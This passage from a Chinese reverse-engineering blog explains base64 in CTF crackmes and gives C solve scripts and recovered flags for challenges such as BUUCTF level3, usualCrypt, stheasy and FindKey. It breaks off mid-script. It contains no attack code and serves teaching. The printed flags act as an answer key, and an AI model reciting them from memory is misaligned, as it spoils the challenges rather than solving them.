result[j++]&#x3D;(findchr(table,src[i])&lt;&lt;2)+(findchr(table,src[i+1])&gt;&gt;4);</span><br><span class="line">        result[j++]&#x3D;(findchr(table,src[i+1])&lt;&lt;4)+(findchr(table,src[i+2])&gt;&gt;2);</span><br><span class="line">        result[j++]&#x3D;((findchr(table,src[i+2])&amp;3)&lt;&lt;6)+(findchr(table,src[i+3]));</span><br><span class="line">        &#x2F;&#x2F;注意编码是table对应的编码，不是原来的ascii码</span><br><span class="line">        &#x2F;&#x2F;按位运算符优先级低于位移运算符，注意括号</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">    char words[100]&#x3D;&quot;abc&quot;;</span><br><span class="line">    char en_words[100]&#x3D;&quot;&quot;;</span><br><span class="line">    char de_words[100]&#x3D;&quot;&quot;;</span><br><span class="line">    base64_encode(words,en_words);</span><br><span class="line">    printf(&quot;encode:%s\n&quot;,en_words);</span><br><span class="line">    base64_decode(en_words,de_words);</span><br><span class="line">    printf(&quot;decode:%s\n&quot;,de_words);</span><br><span class="line">    return 0;</span><br><span class="line">    &#x2F;&#x2F;摘抄于https:&#x2F;&#x2F;eqqie.cn&#x2F;index.php&#x2F;laji_note&#x2F;785&#x2F;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="base64在逆向中的应用"><a href="#base64在逆向中的应用" class="headerlink" title="base64在逆向中的应用"></a>base64在逆向中的应用</h1><h2 id="1-直接使用"><a href="#1-直接使用" class="headerlink" title="1.直接使用"></a>1.直接使用</h2><h3 id="flag为解密结果"><a href="#flag为解密结果" class="headerlink" title="flag为解密结果"></a>flag为解密结果</h3><p><a href="https://pan.baidu.com/s/1OekeF05h-IkH_16UZOaXQQ">附件链接</a> 提取码：0000<br><img src="/2021/03/20/base64%E5%9C%A8%E9%80%86%E5%90%91%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/1.PNG"></p><p>图中的flag为ZmxhZ3t5b3VfZ2V0X2l0fQ==，经base64解码得</p><blockquote><p>flag{you_get_it}</p></blockquote><h3 id="flag为加密结果"><a href="#flag为加密结果" class="headerlink" title="flag为加密结果"></a>flag为加密结果</h3><p><a href="https://pan.baidu.com/s/15KN694_td7Ds7xKnp8ussw">附件链接</a> 提取码：0000<br><img src="/2021/03/20/base64%E5%9C%A8%E9%80%86%E5%90%91%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/2.PNG"></p><p>图中的str也是ZmxhZ3t5b3VfZ2V0X2l0fQ==，经base64加密得</p><blockquote><p>flag：Wm14aFozdDViM1ZmWjJWMFgybDBmUT09</p></blockquote><h3 id="如何判断是加密还是解密"><a href="#如何判断是加密还是解密" class="headerlink" title="如何判断是加密还是解密"></a>如何判断是加密还是解密</h3><p>我们可以观察一下密码函数</p><blockquote><p>加密<br><img src="/2021/03/20/base64%E5%9C%A8%E9%80%86%E5%90%91%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/3.PNG"><br>解密<br><img src="/2021/03/20/base64%E5%9C%A8%E9%80%86%E5%90%91%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/4.PNG"></p></blockquote><p>可以发现，加密函数下有一个padding_char，点进去是一个‘=’，那这就是加密函数。<br>或者有‘&amp; 3’‘&amp; 0xf’‘&amp; 0x3f’‘= 61’,也是加密函数。<br>遇到此类题目时，大多数加密的。懒得分析也可以都试试，这也就是一会儿的时间。<br>最后的那个判断还可以和异或联系，注意一下就行，这里便不再举例，<br>下面的类型我只说加密，加密和解密的思路都是一样的。</p><h2 id="2-变化字母表"><a href="#2-变化字母表" class="headerlink" title="2.变化字母表"></a>2.变化字母表</h2><p>将base64原来的字母表改变顺序、位置得到新的加密结果。<br>有两种变化方式：1.直接改变；2.用函数改变</p><h3 id="直接改变"><a href="#直接改变" class="headerlink" title="直接改变"></a>直接改变</h3><p><a href="https://pan.baidu.com/s/1mE75zgqcVl2guLosEEiNwQ">附件链接</a> 提取码：0000<br><img src="/2021/03/20/base64%E5%9C%A8%E9%80%86%E5%90%91%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/5.PNG"></p><p><img src="/2021/03/20/base64%E5%9C%A8%E9%80%86%E5%90%91%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/6.PNG"></p><p>这一题的字母表改为了’0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ+/‘，根据这个字母表和原版字母表的差别，将密文修改为正确的密文。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">char a[]&#x3D;&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+&#x2F;&quot;;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">char b[]&#x3D;&quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ+&#x2F;&quot;;</span><br><span class="line">    char c[]&#x3D;&quot;pCNxpTJkq6AAnSAAnSpIg6tZ&quot;;</span><br><span class="line">    int i,j;</span><br><span class="line">    for(i&#x3D;0;i&lt;strlen(c);i++)</span><br><span class="line">    &#123;</span><br><span class="line">        for(j&#x3D;0;j&lt;strlen(a);j++)</span><br><span class="line">        &#123;</span><br><span class="line">            if(b[j]&#x3D;&#x3D;c[i])</span><br><span class="line">            &#123;</span><br><span class="line">                c[i]&#x3D;a[j];</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    for(i&#x3D;0;i&lt;strlen(c);i++)</span><br><span class="line">    &#123;</span><br><span class="line">        printf(&quot;%c&quot;,c[i]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;Thi$_i$_fl@g&#125;</span><br></pre></td></tr></table></figure><h3 id="用函数改变"><a href="#用函数改变" class="headerlink" title="用函数改变"></a>用函数改变</h3><p><a href="https://pan.baidu.com/s/1VpBPqjboo7Wm5yQCXZO1JA">附件链接</a> 提取码：0000<br>这个是调用一个外部函数改变密码表的顺序。</p><p><img src="/2021/03/20/base64%E5%9C%A8%E9%80%86%E5%90%91%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/7.PNG"></p><p><img src="/2021/03/20/base64%E5%9C%A8%E9%80%86%E5%90%91%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/8.PNG"></p><p>这种方式比直接改变复杂了一点点。但也不难。<br>这里用了两次waaaagh函数，另一次再base64_encode里，没有显示。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">char a[]&#x3D;&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+&#x2F;&quot;;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">char b[]&#x3D;&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+&#x2F;&quot;;</span><br><span class="line">    char c[]&#x3D;&quot;tSdNt3ZouGQQr2QQr2tYkGx9&quot;;</span><br><span class="line">    int i,j;</span><br><span class="line">    int n&#x3D;10;</span><br><span class="line">char ch;</span><br><span class="line">while(n&lt;40)</span><br><span class="line">&#123;</span><br><span class="line">ch&#x3D;b[n];</span><br><span class="line">b[n]&#x3D;b[n+10];</span><br><span class="line">b[n+10]&#x3D;ch;</span><br><span class="line">n++;</span><br><span class="line">&#125;</span><br><span class="line">n&#x3D;10;</span><br><span class="line">while(n&lt;40)</span><br><span class="line">&#123;</span><br><span class="line">ch&#x3D;b[n];</span><br><span class="line">b[n]&#x3D;b[n+10];</span><br><span class="line">b[n+10]&#x3D;ch;</span><br><span class="line">n++;</span><br><span class="line">&#125;</span><br><span class="line">    for(i&#x3D;0;i&lt;strlen(c);i++)</span><br><span class="line">    &#123;</span><br><span class="line">        for(j&#x3D;0;j&lt;strlen(a);j++)</span><br><span class="line">        &#123;</span><br><span class="line">            if(b[j]&#x3D;&#x3D;c[i])</span><br><span class="line">            &#123;</span><br><span class="line">                c[i]&#x3D;a[j];</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    for(i&#x3D;0;i&lt;strlen(c);i++)</span><br><span class="line">    &#123;</span><br><span class="line">        printf(&quot;%c&quot;,c[i]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;Thi$_i$_fl@g&#125;</span><br></pre></td></tr></table></figure><h1 id="buuctf"><a href="#buuctf" class="headerlink" title="buuctf"></a>buuctf</h1><h2 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h2><p><a href="https://buuoj.cn/challenges#[WUSTCTF2020]level3">题目链接</a><br><img src="/2021/03/20/base64%E5%9C%A8%E9%80%86%E5%90%91%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/9.PNG"></p><p><img src="/2021/03/20/base64%E5%9C%A8%E9%80%86%E5%90%91%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/10.PNG"></p><p>和上面的那题差不多。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">int i,j,v0,result;</span><br><span class="line">char ch[]&#x3D;&quot;d2G0ZjLwHjS7DmOzZAY0X2lzX3CoZV9zdNOydO9vZl9yZXZlcnGlfD&#x3D;&#x3D;&quot;;</span><br><span class="line">char base64_table[]&#x3D;&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+&#x2F;&quot;;</span><br><span class="line">char base64_table1[]&#x3D;&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+&#x2F;&quot;;</span><br><span class="line"> for ( i &#x3D; 0; i &lt;&#x3D; 9; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">    v0 &#x3D; base64_table[i];</span><br><span class="line">    base64_table[i] &#x3D; base64_table[19 - i];</span><br><span class="line">    result &#x3D; 19 - i;</span><br><span class="line">    base64_table[result] &#x3D; v0;</span><br><span class="line">    &#125;</span><br><span class="line">for(i&#x3D;0;i&lt;strlen(ch);i++)</span><br><span class="line">    &#123;</span><br><span class="line">        for(j&#x3D;0;j&lt;strlen(base64_table1);j++)</span><br><span class="line">        &#123;</span><br><span class="line">            if(base64_table[j]&#x3D;&#x3D;ch[i])</span><br><span class="line">            &#123;</span><br><span class="line">                ch[i]&#x3D;base64_table1[j];</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    for(i&#x3D;0;i&lt;strlen(ch);i++)</span><br><span class="line">    &#123;</span><br><span class="line">        printf(&quot;%c&quot;,ch[i]);</span><br><span class="line">    &#125;</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>flag{Base64_is_the_start_of_reverse}</p></blockquote><h2 id="usualCrypt"><a href="#usualCrypt" class="headerlink" title="usualCrypt"></a>usualCrypt</h2><p><a href="https://buuoj.cn/challenges#[ACTF%E6%96%B0%E7%94%9F%E8%B5%9B2020]usualCrypt">题目链接</a><br><img src="/2021/03/20/base64%E5%9C%A8%E9%80%86%E5%90%91%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/11.PNG"></p><p><img src="/2021/03/20/base64%E5%9C%A8%E9%80%86%E5%90%91%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/12.PNG"></p><p><img src="/2021/03/20/base64%E5%9C%A8%E9%80%86%E5%90%91%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/13.PNG"></p><p><img src="/2021/03/20/base64%E5%9C%A8%E9%80%86%E5%90%91%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/14.PNG"></p><p>这一题除了字母表的变化，还将密文的字母大小写交换了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">char a[]&#x3D;&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+&#x2F;&quot;;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">char b[]&#x3D;&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+&#x2F;&quot;;</span><br><span class="line">    char c[]&#x3D;&quot;zMXHz3TIgnxLxJhFAdtZn2fFk3lYCrtPC2l9&quot;;</span><br><span class="line">    int i,j,v1;</span><br><span class="line">    int result &#x3D; 6;</span><br><span class="line">    for (i&#x3D;0;i&lt;strlen(c);i++)</span><br><span class="line">    &#123;</span><br><span class="line">    if ( c[i] &gt;&#x3D; &#39;a&#39; &amp;&amp; c[i] &lt;&#x3D; &#39;z&#39; )</span><br><span class="line">    &#123;</span><br><span class="line">        c[i] -&#x3D; 32;</span><br><span class="line">    &#125;</span><br><span class="line">      else if ( c[i] &gt;&#x3D; &#39;A&#39; &amp;&amp; c[i] &lt;&#x3D; &#39;Z&#39; )</span><br><span class="line">      &#123;</span><br><span class="line">        c[i] +&#x3D; 32;</span><br><span class="line">      &#125;</span><br><span class="line">      else</span><br><span class="line">      &#123;</span><br><span class="line">      c[i] &#x3D; c[i];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">  do</span><br><span class="line">  &#123;</span><br><span class="line">    v1 &#x3D; b[result+10];</span><br><span class="line">    b[result+10] &#x3D; b[result];</span><br><span class="line">    b[result++] &#x3D; v1;</span><br><span class="line">  &#125;</span><br><span class="line">  while ( result &lt; 15 );</span><br><span class="line">    for(i&#x3D;0;i&lt;strlen(c);i++)</span><br><span class="line">    &#123;</span><br><span class="line">        for(j&#x3D;0;j&lt;strlen(a);j++)</span><br><span class="line">        &#123;</span><br><span class="line">            if(b[j]&#x3D;&#x3D;c[i])</span><br><span class="line">            &#123;</span><br><span class="line">                c[i]&#x3D;a[j];</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    for(i&#x3D;0;i&lt;strlen(c);i++)</span><br><span class="line">    &#123;</span><br><span class="line">        printf(&quot;%c&quot;,c[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>flag{bAse64_h2s_a_Surprise}</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Re </category>
          
          <category> 知识点 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF-Re-知识点 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Jarvis OJ</title>
      <link href="2021/03/03/Jarvis-OJ/"/>
      <url>2021/03/03/Jarvis-OJ/</url>
      
        <content type="html"><![CDATA[<h1 id="stheasy"><a href="#stheasy" class="headerlink" title="stheasy"></a>stheasy</h1><a id="more"></a><p><a href="https://pan.baidu.com/s/1Ev7oxqScoIAP5-pb_ZKxdw">附件链接</a> 提取码：0000<br>放入ida32中，进入main函数。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main()</span><br><span class="line">&#123;</span><br><span class="line">  char s; &#x2F;&#x2F; [esp+10h] [ebp-110h]</span><br><span class="line"></span><br><span class="line">  printf(&quot;Input flag:&quot;);</span><br><span class="line">  sub_80485A0(&amp;s, 0x100u);</span><br><span class="line">  if ( sub_8048630(&amp;s) )</span><br><span class="line">    puts(&quot;Flag is right.&quot;);</span><br><span class="line">  else</span><br><span class="line">    puts(&quot;Flag is wrong.&quot;);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>查看sub_8048630</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl sub_8048630(char *s)</span><br><span class="line">&#123;</span><br><span class="line">  size_t v1; &#x2F;&#x2F; eax</span><br><span class="line">  int v3; &#x2F;&#x2F; edx</span><br><span class="line"></span><br><span class="line">  if ( s )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 &#x3D; strlen(s);</span><br><span class="line">    if ( v1 )</span><br><span class="line">    &#123;</span><br><span class="line">      if ( v1 &#x3D;&#x3D; 29 )</span><br><span class="line">      &#123;</span><br><span class="line">        v3 &#x3D; 0;</span><br><span class="line">        while ( s[v3] &#x3D;&#x3D; stru_8049AE0[(stru_8049B15[v3] &#x2F; 3u - 2)] )</span><br><span class="line">        &#123;</span><br><span class="line">          if ( ++v3 &#x3D;&#x3D; 29 )</span><br><span class="line">            return 1;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们需要返回值为1，判断相等就行了。<br>脚本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    int i;</span><br><span class="line">    int a[29]&#x3D;&#123;0x48,0x5D,0x8D,0x24,0x84,0x27,0x99,0x9F,0x54,0x18,0x1E,</span><br><span class="line">0x69,0x7E,0x33,0x15,0x72,0x8D,0x33,0x24,0x63,0x21,0x54,0x0C,0x78,</span><br><span class="line">0x78,0x78,0x78,0x78,0x1B&#125;;</span><br><span class="line">char b[]&#x3D;&quot;lk2j9Gh&#125;AgfY4ds-a6QW1#k5ER_T[cvLbV7nOm3ZeX&#123;CMt8SZo]U&quot;;</span><br><span class="line">int flag[29];</span><br><span class="line">    for(i&#x3D;0;i&lt;29;i++)</span><br><span class="line">    &#123;</span><br><span class="line">    flag[i]&#x3D;b[(a[i]&#x2F;3-2)];</span><br><span class="line">    if(flag[i]&lt;0)</span><br><span class="line">        flag[i]+&#x3D;128;</span><br><span class="line">    printf(&quot;%c&quot;,flag[i]);</span><br><span class="line">&#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>kctf{YoU_hAVe-GOt-fLg_233333}</p></blockquote><h1 id="FindKey"><a href="#FindKey" class="headerlink" title="FindKey"></a>FindKey</h1><p><a href="https://pan.baidu.com/s/1p4533RDCl_ba51tAAZGe0g">附件链接</a> 提取码：0000<br>这是一个pyc文件，将后缀改为pyc即可反编译。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">import sys</span><br><span class="line">lookup &#x3D; [196,153, 149,206, 17,221, 10, 217, 167, 18, 36, 135, 103, 61, 111, 31, 92, 152, </span><br><span class="line">21, 228, 105, 191, 173, 41, 2, 245, 23, 144, 1, 246, 89, 178, 182, 119, 38, 85, 48, 226, </span><br><span class="line">165, 241, 166, 214, 71, 90, 151, 3, 109, 169, 150, 224, 69, 156, 158, 57, 181, 29, 200, 37, </span><br><span class="line">51, 252, 227, 93, 65, 82, 66, 80, 170, 77, 49, 177, 81, 94, 202, 107, 25, 73, 148, 98, 129, </span><br><span class="line">231, 212, 14, 84, 121, 174, 171, 64, 180, 233, 74, 140, 242, 75, 104, 253, 44, 39, 87, 86, </span><br><span class="line">27, 68, 22, 55, 76, 35, 248, 96, 5, 56, 20, 161, 213, 238, 220, 72, 100, 247, 8, 63, 249, </span><br><span class="line">145, 243, 155, 222, 122, 32, 43, 186, 0, 102, 216, 126, 15, 42, 115, 138, 240, 147, 229, </span><br><span class="line">204, 117, 223, 141, 159, 131, 232, 124, 254, 60, 116, 46, 113, 79, 16, 128, 6, 251, 40, </span><br><span class="line">205, 137, 199, 83, 54, 188, 19, 184, 201, 110, 255, 26, 91, 211, 132, 160, 168, 154, 185, </span><br><span class="line">183, 244, 78, 33, 123, 28, 59, 12, 210, 218, 47, 163, 215, 209, 108, 235, 237, 118, 101, </span><br><span class="line">24, 234, 106, 143, 88, 9, 136, 95, 30, 193, 176, 225, 198, 197, 194, 239, 134, 162, 192, </span><br><span class="line">11, 70, 58, 187, 50, 67, 236, 230, 13, 99, 190, 208, 207, 7, 53, 219, 203, 62, 114, 127, </span><br><span class="line">125, 164, 179, 175, 112, 172, 250, 133, 130, 52, 189, 97, 146, 34, 157, 120, 195, 45, 4, </span><br><span class="line">142, 139]</span><br><span class="line">pwda &#x3D; [188,155,11,58,251,208,204,202,150,120,206,237,114,92,126,6,42]</span><br><span class="line">pwdb &#x3D; [53,222,230,35,67,248,226,216,17,209,32,2,181,200,171,60,108]</span><br><span class="line">flag &#x3D; raw_input(&#39;Input your Key:&#39;).strip()</span><br><span class="line">if len(flag) !&#x3D; 17:</span><br><span class="line">    print &#39;Wrong Key!!&#39;</span><br><span class="line">    sys.exit(1)</span><br><span class="line">flag &#x3D; flag[::-1]</span><br><span class="line">for i in range(0, len(flag)):</span><br><span class="line">    if ord(flag[i]) + pwda[i] &amp; 255 !&#x3D; lookup[i + pwdb[i]]:</span><br><span class="line">        print &#39;Wrong Key!!&#39;</span><br><span class="line">        sys.exit(1)</span><br><span class="line"></span><br><span class="line">print &#39;Congratulations!!&#39;</span><br></pre></td></tr></table></figure><p>这里就是计算+倒序。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    int i;</span><br><span class="line">    int a[]&#x3D;&#123;196,153, 149,206, 17,221, 10, 217, 167, 18, 36, 135, 103, 61, 111, 31, 92, 152, </span><br><span class="line">    21, 228, 105, 191, 173, 41, 2, 245, 23, 144, 1, 246, 89, 178, 182, 119, 38, 85, 48, 226, </span><br><span class="line">    165, 241, 166, 214, 71, 90, 151, 3, 109, 169, 150, 224, 69, 156, 158, 57, 181, 29, 200, 37, </span><br><span class="line">    51, 252, 227, 93, 65, 82, 66, 80, 170, 77, 49, 177, 81, 94, 202, 107, 25, 73, 148, 98, 129, </span><br><span class="line">    231, 212, 14, 84, 121, 174, 171, 64, 180, 233, 74, 140, 242, 75, 104, 253, 44, 39, 87, 86, </span><br><span class="line">    27, 68, 22, 55, 76, 35, 248, 96, 5, 56, 20, 161, 213, 238, 220, 72, 100, 247, 8, 63, 249, </span><br><span class="line">    145, 243, 155, 222, 122, 32, 43, 186, 0, 102, 216, 126, 15, 42, 115, 138, 240, 147, 229, </span><br><span class="line">    204, 117, 223, 141, 159, 131, 232, 124, 254, 60, 116, 46, 113, 79, 16, 128, 6, 251, 40, </span><br><span class="line">    205, 137, 199, 83, 54, 188, 19, 184, 201, 110, 255, 26, 91, 211, 132, 160, 168, 154, 185, </span><br><span class="line">    183, 244, 78, 33, 123, 28, 59, 12, 210, 218, 47, 163, 215, 209, 108, 235, 237, 118, 101, </span><br><span class="line">    24, 234, 106, 143, 88, 9, 136, 95, 30, 193, 176, 225, 198, 197, 194, 239, 134, 162, 192, </span><br><span class="line">    11, 70, 58, 187, 50, 67, 236, 230, 13, 99, 190, 208, 207, 7, 53, 219, 203, 62, 114, 127, </span><br><span class="line">    125, 164, 179, 175, 112, 172, 250, 133, 130, 52, 189, 97, 146, 34, 157, 120, 195, 45, 4, </span><br><span class="line">    142, 139&#125;;</span><br><span class="line">    int 